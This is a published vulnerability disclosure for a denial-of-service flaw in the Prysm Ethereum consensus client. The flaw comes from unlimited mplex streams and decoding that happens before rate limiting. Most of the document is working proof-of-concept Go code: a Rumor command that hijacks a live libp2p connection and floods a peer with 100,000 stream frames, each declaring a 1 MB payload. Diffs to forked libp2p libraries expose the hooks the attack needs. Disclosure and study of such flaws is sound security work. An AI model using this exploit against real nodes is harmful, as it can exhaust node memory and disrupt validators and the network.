# [M] CL-2021-03: Mplex unlimited open streams + bad Prysm rate limit + stall on SSZ decode

## Summary
Severity: Medium
Chain: Ethereum (consensus layer)
Component: Prysm
Published: 2021-12-01
Source: https://gist.github.com/protolambda/c45a4d9167fc4b20f2f76c749eeb7105
Type: ef-disclosure

## Details
# Prysm DoS

Found by @protolambda, 12 Feb.

Results: 10+ GB instantenous memory jump and brief max-CPU usage. (I didn't try more aggresive dos parameters, it doesn't seem limited here)

Affected version:
```
commit 473172ca8b6a1adb3a825c74b5318df5c3fdb049 develop
Date:   Fri Feb 12 13:06:58 2021 -0600
```
I.e. latest Prysm, and all previous versions are likely affected.

How:
- Go Mplex does not limit the amount of open channels
- Go Mplex multiplexes the (secured) connection into streams
- Two frames per payload: create a unique nameless channel, and fill the channel with pro-active multiselect negotiation and the actual payload.
- Multiselect just says "oh this looks like an Eth2 status RPC stream, carry on"
- Swarm (internals of libp2p host) just accept the stream, wrap it with above negotiation, and fire a go routine for every stream
- **Prysm does not rate-limit before decoding**
  - Entry point hits decoding before the type-specific rate-limiting: https://github.com/prysmaticlabs/prysm/blob/0716519be90ca91e2bc79891def2ac28204b4e38/beacon-chain/sync/rpc.go#L64
- the 2nd mplex frame per payload has something special to be decoded (after the protocol negotiation): a varint that declares the length of a 1 MB SSZ blob.
  - The 1 MB is pre-allocated for further decoding, for each of those frames. The stream is never continued, no more frames, Prysm won't get to decode anything.
    - Prysm decoding code: https://github.com/prysmaticlabs/prysm/blob/0716519be90ca91e2bc79891def2ac28204b4e38/beacon-chain/p2p/encoder/ssz.go#L138
  - Prysm does not have strict request size limits per type. Other clients limit requests to sensible sizes within Eth2 type bounds (a few hundred bytes), and thus less prone to DoS (untested though).
- Attackers puts 100.000 of these tiny payloads (< 100 bytes each, thus < 10 MB total) and sends it all at once to the connected Prysm node.
- The attack can be repeated at low cost too.

Demo screenshot:
![](https://storage.googleapis.com/ethereum-hackmd/upload_3fe3c39f17ab162638a5bbb2a2d70252.png)

Hacky code to demonstrate attack:

*Note, forked gp-mplex, libp2p-go-mplex, and libp2p-swarm to gain access to private API methods, and had to use older versions since Rumor is not updated to latest libp2p yet.
With that I was able to hijack mplex loop on live connection, and get the rumor node to attack a local Prysm node.*

New in rumor: `dos.go` for DoS command
```go
package rpc

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	peerstream_multiplex "github.com/libp2p/go-libp2p-mplex"
	swarm "github.com/libp2p/go-libp2p-swarm"
	stream "github.com/libp2p/go-libp2p-transport-upgrader"
	"github.com/multiformats/go-varint"
	"github.com/protolambda/rumor/control/actor/base"
	"github.com/protolambda/rumor/control/actor/flags"
	"io"
	"net"
)

type RpcDoSCmd struct {
	*base.Base
	PeerID      flags.PeerIDFlag      `ask:"<peer-id>" help:"libp2p Peer-ID to attack"`
}

func (c *RpcDoSCmd) Help() string {
	return "DoS node"
}

func writeUvarint(w io.Writer, i uint64) error {
	varintbuf := make([]byte, 16)
	n := varint.PutUvarint(varintbuf, i)
	_, err := w.Write(varintbuf[:n])
	if err != nil {
		return err
	}
	return nil
}

func delimWrite(w io.Writer, mes []byte) error {
	err := writeUvarint(w, uint64(len(mes)+1))
	if err != nil {
		return err
	}

	_, err = w.Write(mes)
	if err != nil {
		return err
	}

	_, err = w.Write([]byte{'\n'})
	if err != nil {
		return err
	}
	return nil
}

// +1 for initiator
const (
	newStreamTag = 0
	messageTag   = 2
	closeTag     = 4
	resetTag     = 6
)

// avoid collision with other mplex frames
var offset uint64 = 1000000

func (c *RpcDoSCmd) Run(ctx context.Context, args ...string) error {
	h, err := c.Host()
	if err != nil {
		return err
	}

	conns := h.Network().ConnsToPeer(c.PeerID.PeerID)
	if len(conns) != 1 {
		return fmt.Errorf("expected 1 connection to peer, got %d", len(conns))
	}
	conn := conns[0]
	sc := conn.(*swarm.Conn)
	cc := sc.CapConn()

	mplCon := stream.UnwrapMuxed(cc).(*peerstream_multiplex.ShimConn).MplexInner()


	// Prepare payload, this is repeated over and over again, to trick Prysm into lots of stream handling.
	var payloadBuf bytes.Buffer
	// pro-active multistream-select handshake. We don't care for their response,
	// we just need the stream to be an eth2 RPC stream.
	protos := []string{"/multistream/1.0.0", "/eth2/beacon_chain/req/status/1/ssz_snappy"}
	_ = delimWrite(&payloadBuf, []byte(protos[0]))
	_ = delimWrite(&payloadBuf, []byte(protos[1]))
	var tmp [10]byte
	// Max size prysm accepts for Eth2 RPC request ssz_snappy payload: 1 MB
	maxRPCSize := uint64(1) << 20
	n := binary.PutUvarint(tmp[:], maxRPCSize)
	payloadBuf.Write(tmp[:n])
	payload := payloadBuf.Bytes()


	framesPerAttack := uint64(100000)

	// Borrow the mplex connection and attack!
	// Write a lot of mplex channels, all with status RPC with 1 MB message payload

	if err := mplCon.Hijack(func(conn net.Conn) {
		var buf bytes.Buffer
		var tmp [10]byte

		// write a all those stream open frames and stream message frames
		for i := offset; i < offset + framesPerAttack; i++ {
			n := binary.PutUvarint(tmp[:], (i<<3)|(newStreamTag))
			buf.Write(tmp[:n])

			// empty! the open-tag has a payload with the stream name. Just use an empty name.
			n = binary.PutUvarint(tmp[:n], 0)
			buf.Write(tmp[:n])

			// Now write a frame with an incomplete payload for this mplex frame
			n = binary.PutUvarint(tmp[:], (i<<3)|(messageTag))
			buf.Write(tmp[:n])

			n = binary.PutUvarint(tmp[:n], uint64(len(payload)))
			buf.Write(tmp[:n])

			buf.Write(payload)
		}
		// use different offset next time
		offset += framesPerAttack

		// We don't close the mplex streams.
		// The victim will just start reading from it, and allocate before it times out.

		n, err := conn.Write(buf.Bytes())
		if err != nil {
			c.Log.WithError(err).WithField("n", n).Error("failed to write DoS payload")
		}
	}); err != nil {
		c.Log.WithError(err).Error("failed to hijack connection, it was closed probably")
	}
	return nil
}
```

Use local forks and apply diffs for hacked in functionality:
```go
replace (
	github.com/libp2p/go-libp2p-mplex v0.2.4 => ../go-libp2p-mplex
	github.com/libp2p/go-libp2p-swarm v0.2.8 => ../go-libp2p-swarm
	github.com/libp2p/go-mplex v0.1.3 => ../go-mplex
	github.com/libp2p/go-libp2p-transport-upgrader v0.3.0 => ../go-libp2p-transport-upgrader
)
```

```
diff --git a/multiplex.go b/multiplex.go
index fbb80db..efe38d0 100644
--- a/multiplex.go
+++ b/multiplex.go
@@ -67,6 +67,8 @@ const (
 	resetTag     = 6
 )
 
+type HijackFn func(conn net.Conn)
+
 // Multiplex is a mplex session.
 type Multiplex struct {
 	con       net.Conn
@@ -79,6 +81,7 @@ type Multiplex struct {
 	shutdownErr  error
 	shutdownLock sync.Mutex
 
+	hijackCh    chan HijackFn
 	writeCh         chan []byte
 	writeTimer      *time.Timer
 	writeTimerFired bool
@@ -101,6 +104,7 @@ func NewMultiplex(con net.Conn, initiator bool) *Multiplex {
 		writeCh:    make(chan []byte, 16),
 		writeTimer: time.NewTimer(0),
 		nstreams:   make(chan *Stream, 16),
+		hijackCh:   make(chan HijackFn),
 	}
 
 	go mp.handleIncoming()
@@ -168,6 +172,15 @@ func (mp *Multiplex) IsClosed() bool {
 	}
 }
 
+func (mp *Multiplex) Hijack(fn HijackFn) error {
+	select {
+	case mp.hijackCh <- fn:
+		return nil
+	case <-mp.shutdown:
+		return ErrShutdown
+	}
+}
+
 func (mp *Multiplex) sendMsg(done <-chan struct{}, header uint64, data []byte) error {
 	buf := pool.Get(len(data) + 20)
 
@@ -191,7 +204,8 @@ func (mp *Multiplex) handleOutgoing() {
 		select {
 		case <-mp.shutdown:
 			return
-
+		case fn := <- mp.hijackCh:
+			fn(mp.con)
 		case data := <-mp.writeCh:
 			// FIXME: https://github.com/libp2p/go-libp2p/issues/644
 			// write coalescing disabled until this can be fixed.
```

```diff
diff --git a/conn.go b/conn.go
index 00f89a0..b9fd9b3 100644
--- a/conn.go
+++ b/conn.go
@@ -5,28 +5,35 @@ import (
 	mp "github.com/libp2p/go-mplex"
 )
 
-type conn mp.Multiplex
+type ShimConn mp.Multiplex
 
-func (c *conn) Close() error {
+type conn = ShimConn
+
+func (c *ShimConn) Close() error {
 	return c.mplex().Close()
 }
 
-func (c *conn) IsClosed() bool {
+func (c *ShimConn) IsClosed() bool {
 	return c.mplex().IsClosed()
 }
 
 // OpenStream creates a new stream.
-func (c *conn) OpenStream() (mux.MuxedStream, error) {
+func (c *ShimConn) OpenStream() (mux.MuxedStream, error) {
 	return c.mplex().NewStream()
 }
 
 // AcceptStream accepts a stream opened by the other side.
-func (c *conn) AcceptStream() (mux.MuxedStream, error) {
+func (c *ShimConn) AcceptStream() (mux.MuxedStream, error) {
 	return c.mplex().Accept()
 }
 
-func (c *conn) mplex() *mp.Multiplex {
+func (c *ShimConn) mplex() *mp.Multiplex {
 	return (*mp.Multiplex)(c)
 }
 
+func (c *ShimConn) MplexInner() *mp.Multiplex {
+	return c.mplex()
+}
+
+
 var _ mux.MuxedConn = &conn{}
diff --git a/go.mod b/go.mod
index 096658f..467c32d 100644
--- a/go.mod
+++ b/go.mod
@@ -11,3 +11,7 @@ require (
 	github.com/opentracing/opentracing-go v1.2.0 // indirect
 	go.uber.org/zap v1.15.0 // indirect
 )
+
+replace (
+	github.com/libp2p/go-mplex v0.1.3 => ../go-mplex
+)
```

```diff
diff --git a/swarm_conn.go b/swarm_conn.go
index 946936c..692d562 100644
--- a/swarm_conn.go
+++ b/swarm_conn.go
@@ -41,6 +41,10 @@ type Conn struct {
 	stat network.Stat
 }
 
+func (c *Conn) CapConn() transport.CapableConn {
+	return c.conn
+}
+
 func (c *Conn) ID() string {
 	// format: <first 10 chars of peer id>-<global conn ordinal>
 	return fmt.Sprintf("%s-%d", c.RemotePeer().Pretty()[0:10], c.id)
diff --git a/swarm_stream.go b/swarm_stream.go
index 803ba4d..8b7fcfe 100644
--- a/swarm_stream.go
+++ b/swarm_stream.go
@@ -45,6 +45,10 @@ type Stream struct {
 	stat network.Stat
 }
 
+func (s *Stream) MuxStream() mux.MuxedStream {
+	return s.stream
+}
+
 func (s *Stream) ID() string {
 	// format: <first 10 chars of peer id>-<global conn ordinal>-<global stream ordinal>
 	return fmt.Sprintf("%s-%d", s.conn.ID(), s.id)
```
